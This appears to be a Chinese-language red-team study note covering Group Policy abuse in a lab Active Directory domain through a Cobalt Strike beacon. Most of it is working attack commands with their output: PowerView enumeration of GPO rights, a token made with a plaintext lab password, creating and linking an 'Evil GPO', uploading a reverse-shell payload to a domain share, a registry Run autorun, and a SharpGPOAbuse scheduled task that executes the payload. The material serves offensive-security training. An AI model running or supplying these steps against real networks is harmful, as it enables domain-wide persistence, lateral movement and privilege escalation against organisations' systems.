# Group Policy

使用 PowerView 查询将显示可以在域中创建新 GPO 的主体的安全标识符 (SID)

```
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[+] host called home, sent: 145572 bytes
beacon> powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
[*] Tasked beacon to run: Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
[+] host called home, sent: 861 bytes
[+] received output:
#< CLIXML


ObjectDN              : CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : CreateChild
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125
```

根据sid反查名称
```
beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
[*] Tasked beacon to run: ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
[+] host called home, sent: 449 bytes
[+] received output:
#< CLIXML
DEV\1st Line Support

```

此查询将返回可以写入 OU 上的 GP-Link 属性的主体
```
beacon> powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
[*] Tasked beacon to run: Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
[+] host called home, sent: 773 bytes
[+] received output:
#< CLIXML


ObjectDN           : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN           : OU=Servers,DC=dev,DC=cyberbotic,DC=io
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN           : OU=Tier 1,OU=Servers,DC=dev,DC=cyberbotic,DC=io
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN           : OU=Tier 2,OU=Servers,DC=dev,DC=cyberbotic,DC=io
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125

```

从该输出中，我们可以看到1st Line Support域组既可以创建新的 GPO ，也可以将它们链接到多个 OU


如果更多特权用户通过这些 OU 中的任何计算机的身份验证，这可能会导致特权升级

如果我们可以将 GPO 链接到包含敏感文件或数据库服务器的 OU——我们可以使用这些 GPO 访问这些机器，然后访问存储在它们上的数据

```
beacon> powershell Get-DomainComputer | ? { $_.DistinguishedName -match "OU=Tier 1" } | select DnsHostName
[*] Tasked beacon to run: Get-DomainComputer | ? { $_.DistinguishedName -match "OU=Tier 1" } | select DnsHostName
[+] host called home, sent: 517 bytes
[+] received output:
#< CLIXML

dnshostname            
-----------            
srv-1.dev.cyberbotic.io

```



查询用户和/或组可以修改现有 GPO 的实例
```
beacon> powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
[*] Tasked beacon to run: Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
[+] host called home, sent: 1033 bytes
[+] received output:
#< CLIXML


ObjectDN              : CN={AD7EE1ED-CDC8-4994-AE0F-50BA8B264829},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1126



beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126
[*] Tasked beacon to run: ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126
[+] host called home, sent: 449 bytes
[+] received output:
#< CLIXML
DEV\Developers

```


解析上面的解析 ObjectDN
```
beacon> powershell Get-DomainGPO -Name "{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}" -Properties DisplayName
[*] Tasked beacon to run: Get-DomainGPO -Name "{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}" -Properties DisplayName
[+] host called home, sent: 509 bytes
[+] received output:
#< CLIXML

displayname       
-----------       
PowerShell Logging

```


# Pivot Listeners

1. 新建


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660605692618.png)


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660605792458.png)

2. 查看,在本地开启了4444端口的监听

```
beacon> run netstat -anp tcp
[*] Tasked beacon to run: netstat -anp tcp
[+] host called home, sent: 46 bytes
[+] received output:

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:4444           0.0.0.0:0              LISTENING

```

3. 设置允许4444端口进站，需要管理员权限

```
PS C:\Users\Administrator> netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444
Ok.

```


4. 以上面的监听器，新建一个payload


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660606024001.png)

5. 执行以后是一个反向的青色箭头的shell


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660606276833.png)


# Remote Server Administration Tools (RSAT)

查看jking的域身份
```

PS H:\> net user jking /domain
The request will be processed at a domain controller for domain dev.cyberbotic.io.

User name                    jking
Full Name                    John King
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2021 3:22:59 PM
Password expires             Never
Password changeable          2/24/2021 3:22:59 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory               \\dc-2\home$\jking
Last logon                   8/15/2022 11:38:57 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *1st Line Support     *Domain Users
                             *Roaming Users        *Proxy Users
The command completed successfully.

```

在1st Line Support组，前面我们已经知道这个组可以创建GPO，并且link给任何OU


以jking的身份创建一个GPO
```
beacon> make_token dev\jking Purpl3Drag0n
[*] Tasked beacon to create a token for dev\jking
[+] host called home, sent: 64 bytes
[+] Impersonated DEV\bfarmer
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 32 bytes
[*] You are DEV\bfarmer
beacon> cd c:/
[*] cd c:/
[+] host called home, sent: 35 bytes
beacon> powershell New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
[*] Tasked beacon to run: New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
[+] host called home, sent: 533 bytes
[+] received output:
#< CLIXML


GpoId       : c5b796ea-72f9-4cdf-8e47-2c983a33b465
DisplayName : Evil GPO
Enabled     : True
Enforced    : False
Target      : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Order       : 4

```



2. 上传rev payload到域的共享文件夹


查找域共享文件夹
```
beacon> powershell Find-DomainShare -CheckShareAccess
[*] Tasked beacon to run: Find-DomainShare -CheckShareAccess
[+] host called home, sent: 385 bytes
[+] received output:
#< CLIXML

Name         Type Remark        ComputerName             
----         ---- ------        ------------             
ADMIN$ 2147483648 Remote Admin  wkstn-1.dev.cyberbotic.io
ADMIN$ 2147483648 Remote Admin  wkstn-2.dev.cyberbotic.io
C$     2147483648 Default share wkstn-2.dev.cyberbotic.io
home$           0               dc-2.dev.cyberbotic.io   
NET...          0 Logon serv... dc-2.dev.cyberbotic.io   
sof...          0               dc-2.dev.cyberbotic.io   
SYSVOL          0 Logon serv... dc-2.dev.cyberbotic.io   
C$     2147483648 Default share wkstn-1.dev.cyberbotic.io
ADMIN$ 2147483648 Remote Admin  srv-1.dev.cyberbotic.io  
C$     2147483648 Default share srv-1.dev.cyberbotic.io  
ADMIN$ 2147483648 Remote Admin  srv-2.dev.cyberbotic.io  
C$     2147483648 Default share srv-2.dev.cyberbotic.io 
```

上传rev payload到域的共享文件夹,这里选择```\\dc-2\software```
```
beacon> cd \\dc-2\software
[*] cd \\dc-2\software
[+] host called home, sent: 47 bytes
beacon> upload C:\Payloads\updater.exe
[*] Tasked beacon to upload C:\Payloads\updater.exe as updater.exe
[+] host called home, sent: 311855 bytes
beacon> ls
[*] Tasked beacon to list files in .
[+] host called home, sent: 43 bytes
[*] Listing: \\dc-2\software\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 304kb    fil     08/15/2022 23:42:26   updater.exe
```

3. 向 HKLM 或 HKCU 配置单元写入 autorun 值以在启动时执行 Beacon 有效负载

这里的意思是当域里的计算机启动时会执行我们在上面上传到```\\dc-2\software```里的updater.exe

```
powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\updater.exe" -Type ExpandString
```

4. 登录域内任何一台计算机，强制更新GPO，重启计算机验证

强制更新GPO
```
gpupdate /target:computer /force
```

# SharpGPOAbuse

SharpGPOAbuse允许将更广泛的“滥用”配置添加到 GPO。它无法创建 GPO，因此我们仍然必须使用 RSAT 执行此操作，或者修改我们已经拥有写入权限的 GPO。在此示例中，我们向 PowerShell 日志记录 GPO 添加了一个即时计划任务，该任务将在应用后立即执行。


```
execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Debug\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\updater.exe" --GPOName "PowerShell Logging"
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660607725852.png)
